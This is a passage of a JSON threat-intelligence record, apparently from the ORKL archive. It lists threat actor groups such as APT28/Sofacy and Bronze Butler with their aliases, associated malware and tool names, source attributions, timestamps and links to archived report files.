            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535777,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653712815,
    "ts_modification_date": 1653712815,
    "files": {
        "pdf": "https://archive.orkl.eu/3feb57c015928b80e07f83c94f3a71be90d0ef45.pdf",
        "text": "https://archive.orkl.eu/3feb57c015928b80e07f83c94f3a71be90d0ef45.txt",
        "img": "https://archive.orkl.eu/3feb57c015928b80e07f83c94f3a71be90d0ef45.jpg"
    }
}